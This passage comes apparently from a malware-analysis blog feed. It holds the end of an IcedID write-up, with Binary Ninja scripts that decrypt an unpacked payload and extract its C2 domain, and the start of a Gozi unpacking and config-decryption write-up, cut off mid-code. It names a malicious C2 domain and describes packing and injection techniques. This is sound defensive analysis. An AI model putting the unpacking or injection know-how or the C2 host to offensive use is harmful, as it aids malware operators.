&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bytearray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">byteorder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b&lt;/span> &lt;span class="o">-=&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b&lt;/span> &lt;span class="o">&amp;amp;=&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xFF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">b&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">unpack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rc4_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FILENAME&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;wb&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">unpack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ADDR_OF_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This script leaves us with a big ole dump file.
But it is progress :)&lt;/p>
&lt;p>If we go back to binja with all the new information we picked up from dynamic analysis, and and follow what happens after this decryption function is called, we will see that the unpacked data is parsed for the string &amp;ldquo;|SPL|&amp;rdquo;.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/18.png"
width="989"
height="478"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/18_hu7972a14cf3447531a8b81997dfe99dfa_64848_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/18_hu7972a14cf3447531a8b81997dfe99dfa_64848_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Searching for |SPL| "
class="gallery-image"
data-flex-grow="206"
data-flex-basis="496px"
>&lt;/p>
&lt;p>If we search for this value ourselves, we can see that it is used as a seperator.
There are 5 payloads that are in this dump.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/19.png"
width="854"
height="464"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/19_hu6e5ec128f7c0e2028edff70a17ce1629_17869_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/19_hu6e5ec128f7c0e2028edff70a17ce1629_17869_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" 5 for the price of 1 "
class="gallery-image"
data-flex-grow="184"
data-flex-basis="441px"
>&lt;/p>
&lt;p>I placed each in &lt;code>HxD&lt;/code> and used their magic bytes to determine what they are.
The first is some stub code that was jumped to from the main process.
I saw this in &lt;code>x64dbg&lt;/code> when tracking the &lt;code>NtCreateSection&lt;/code> api call.
The second one might be a compressed PE file, cuz I can see a PE header, but I&amp;rsquo;ll analyze that in Binja soon.
The third is a full PE file.
Windows defender was able to recognize it as malware, so this is probably the payload the contains the config we want.
Section 4 was a &lt;code>.jfif&lt;/code> file, that contain an image of a lion emblem.
I&amp;rsquo;ll do some analysis on that in a bit in case it contains anything interesting inside the image.
Section 5 was a jpeg of a drawing of a woman.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/20.png"
width="1606"
height="865"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/20_hua3591544d217a252851246f630cacb17_1028268_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/20_hua3591544d217a252851246f630cacb17_1028268_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Interesting pics"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="445px"
>&lt;/p>
&lt;h2 id="dumped-pe">Dumped PE
&lt;/h2>&lt;p>This PE is a lot easier to read.
It will immediately create a thread, with &lt;code>THREAD_CREATE_RUN_IMMEDIATELY&lt;/code>.
There is a call to &lt;code>Sleep&lt;/code> which we can get rid of to speed up analysis.
Then we almost immediately hit the decryption routine that reveals the C2 address we have been hunting for.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/21.png"
width="953"
height="407"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/21_hubfdf2eebe96be33098ff2a201f8ee941_46718_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/21_hubfdf2eebe96be33098ff2a201f8ee941_46718_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Call to decryption routine"
class="gallery-image"
data-flex-grow="234"
data-flex-basis="561px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/22.png"
width="672"
height="433"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/22_huf2da2a7fae5eeab6e8388d8e7c6b2b99_34011_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/22_huf2da2a7fae5eeab6e8388d8e7c6b2b99_34011_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Simple XOR "
class="gallery-image"
data-flex-grow="155"
data-flex-basis="372px"
>&lt;/p>
&lt;p>In this case it was: &lt;code>ilekvoyn.com&lt;/code>.
Continuing through the code, it becomes clear that it is crafting a URL request to this address.
It uses a cookie value obtained early from querying something in our kernel.
Then adds in the result of &lt;code>GetSysCount64&lt;/code> / 1000, then adds in some other values.
Since this is a quick challenge, and an old sample I did not bother seeing what how the value was being generated, but I can assume safely assume it&amp;rsquo;s likely something unique to our infection.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/23.png"
width="1106"
height="404"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/23_hu432940433aa376f036172f82063f2f5f_69117_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/23_hu432940433aa376f036172f82063f2f5f_69117_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Cookie string creation"
class="gallery-image"
data-flex-grow="273"
data-flex-basis="657px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/24.png"
width="467"
height="61"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/24_hue59f29b484e086b960b375cc4050b73c_1654_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/24_hue59f29b484e086b960b375cc4050b73c_1654_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="My special cookie"
class="gallery-image"
data-flex-grow="765"
data-flex-basis="1837px"
>&lt;/p>
&lt;p>Anyways, the goal of this challenge was to unpack and grab the c2 address, and we have enough information to do that.
We just need to combine our unpacking script with the string decryption, and we should be good.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">binaryninja&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">BinaryReader&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">re&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">br&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">config&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x20&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">config&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">extract_url_from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">byte_string&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_ascii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">byte&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">byte_string&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">byte&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">126&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_ascii&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_ascii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">extracted_ascii&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pattern&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">re&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">compile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.*com&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pattern&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">extracted_ascii&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">url&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">config&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7ffc97718000&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">extract_url_from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[*] C2 Address -&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/25.png"
width="686"
height="71"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/25_hue54092cb6e7962d1293af356ed0736fa_6094_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/25_hue54092cb6e7962d1293af356ed0736fa_6094_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Finished "
class="gallery-image"
data-flex-grow="966"
data-flex-basis="2318px"
>&lt;/p>
&lt;p>I could have automated the entirety of this, but its an old sample so I don&amp;rsquo;t wanna put a ton of effort into something that may only be valid for this sample, so instead I&amp;rsquo;ll move onto a fresh upload, maybe agent tesla :D&lt;/p>
&lt;p>You can find all the scripts I used &lt;a class="link" href="https://github.com/Kvn11/scripts/tree/main" target="_blank" rel="noopener"
>HERE&lt;/a>&lt;/p></description></item><item><title>Gozi malware unpacking and config extraction</title><link>https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/</link><pubDate>Mon, 27 Nov 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/</guid><description>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/cover.jpg" alt="Featured image of post Gozi malware unpacking and config extraction" />&lt;h2 id="sample-info">Sample Info
&lt;/h2>&lt;p>&lt;a class="link" href="https://bazaar.abuse.ch/sample/0a66e8376fc6d9283e500c6e774dc0a109656fd457a0ce7dbf40419bc8d50936/" target="_blank" rel="noopener"
>0a66e8376fc6d9283e500c6e774dc0a109656fd457a0ce7dbf40419bc8d50936&lt;/a>&lt;/p>
&lt;h2 id="unpacking">Unpacking
&lt;/h2>&lt;p>The &lt;code>dll&lt;/code> is loaded at &lt;code>0x400000&lt;/code> in &lt;code>x32dbg&lt;/code>.
We can set breakpoints at &lt;code>VirtualAlloc&lt;/code> and &lt;code>VirtualProtect&lt;/code> to catch any regions of memory where the desired payload will be unpacked to.
This method will show that &lt;code>VirtualAlloc&lt;/code> is called 3 times.
The first contains some encrypted or encoded data, and isn&amp;rsquo;t very useful to us.
The second call will allocate at &lt;code>x0dF0000&lt;/code> where a mangled &lt;code>PE&lt;/code> gets written to.
The third call is interesting because it comes from the PE file written to the second allocation.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/1.png"
width="701"
height="130"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/1_hub3c112b6c2702c0095feab9ead5374db_10009_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/1_hub3c112b6c2702c0095feab9ead5374db_10009_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Third call comes from within second mem allocation"
class="gallery-image"
data-flex-grow="539"
data-flex-basis="1294px"
>&lt;/p>
&lt;p>This third allocation is made at &lt;code>0x2BC0000&lt;/code> and also contains a &lt;code>PE&lt;/code> file, but its headers are not mangled like the first.
We can dump this one to take a look.
Alternatively, you can also go through the &lt;code>VirtualProtect&lt;/code> calls.
This &lt;code>PE&lt;/code> will be used to overwrite the running process.
After the last &lt;code>VirtualProtect&lt;/code>, you can dump the original process memory and you&amp;rsquo;ll have the same bin file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/2.png"
width="533"
height="224"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/2_hufdffc2a5a5fe8f87feb28c32f4da8039_7895_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/2_hufdffc2a5a5fe8f87feb28c32f4da8039_7895_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="MZ says its a PE file"
class="gallery-image"
data-flex-grow="237"
data-flex-basis="571px"
> &lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/3.png"
width="1059"
height="224"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/3_hu200c9c1a9d3de7a88548d18dcb944378_8694_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/3_hu200c9c1a9d3de7a88548d18dcb944378_8694_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=".bss with low entropy is misleading"
class="gallery-image"
data-flex-grow="472"
data-flex-basis="1134px"
>&lt;/p>
&lt;p>At this point, I wasn&amp;rsquo;t sure if this was the last stage or not, so I continue in &lt;code>x32dbg&lt;/code> in case I ran into more &lt;code>VirtualAlloc&lt;/code> or &lt;code>HeapAlloc&lt;/code> but pretty soon realized this was the main module.
The sample will use local APC injection to run some threads to decrypt the config we want and a few other tasks.
For the sake of brevity I will skip pass that process, but if you wanted to repeat it, you could set a break point at the call to &lt;code>CreateThread&lt;/code> (&lt;code>0x402020&lt;/code>), and once you get there, change the &lt;code>EIP&lt;/code> to point to the thread payload, which should be &lt;code>0x401b7f&lt;/code>.
After locating the code that was decrypting the config data in &lt;code>.bss&lt;/code>, I was able to continue the reversing process in Binary Ninja.&lt;/p>
&lt;h2 id="reversing-decryption-routine">Reversing Decryption Routine
&lt;/h2>&lt;p>The decryption process is pretty straightforward from here.
First, a base of 0 is established.
Then the key is subtracted from this base.
Then this new value (&lt;code>base - key&lt;/code>) is added with the &lt;code>dword&lt;/code> of data being decrypted.
Then the decrypted data is written to a buffer.
This loop will happen a max of &lt;code>0x400&lt;/code> times, or until the data grabbed is 0.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/6.png"
width="1050"
height="677"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/6_hu21f0da7eed4ee62b4985d87338685bd7_52904_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/6_hu21f0da7eed4ee62b4985d87338685bd7_52904_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Simple decryption loop"
class="gallery-image"
data-flex-grow="155"
data-flex-basis="372px"
>&lt;/p>
&lt;p>The pseudo code could be understood as:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x400&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dword&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encrypted_data&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">dword&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prev&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">decrypted_dword&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">dword&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">decrypted_dword&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="key-generation">Key generation
&lt;/h2>&lt;p>Figuring out the key is a bit more tricky.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/4.png"
width="941"
height="503"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/4_hu46a1f1dcbf9cb71c408f8955410fbc82_46584_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/4_hu46a1f1dcbf9cb71c408f8955410fbc82_46584_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Somewhat complex (not really) key generation"
class="gallery-image"
data-flex-grow="187"
data-flex-basis="448px"
>&lt;/p>
&lt;p>Stepping through &lt;code>x32dbg&lt;/code> I was able to figure out the formula to be:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
